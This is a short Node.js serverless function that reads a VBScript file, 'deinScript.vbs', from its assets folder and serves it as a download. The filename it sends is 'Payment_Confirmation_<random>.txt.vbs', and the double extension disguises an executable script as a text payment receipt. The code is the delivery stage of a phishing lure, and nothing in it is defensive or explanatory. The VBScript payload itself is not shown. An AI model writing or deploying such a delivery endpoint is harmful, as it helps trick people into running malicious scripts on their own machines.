const fs = require("fs");
const path = require("path");

exports.handler = async (event, context) => {
  const filePath = path.join(__dirname, "assets", "deinScript.vbs");

  try {
    const scriptContent = fs.readFileSync(filePath, "utf8");
    const uniqueToken = Math.random().toString(36).substring(2, 10);

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename=Payment_Confirmation_${uniqueToken}.txt.vbs`
      },
      body: scriptContent
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify(error)
    };
  }
};
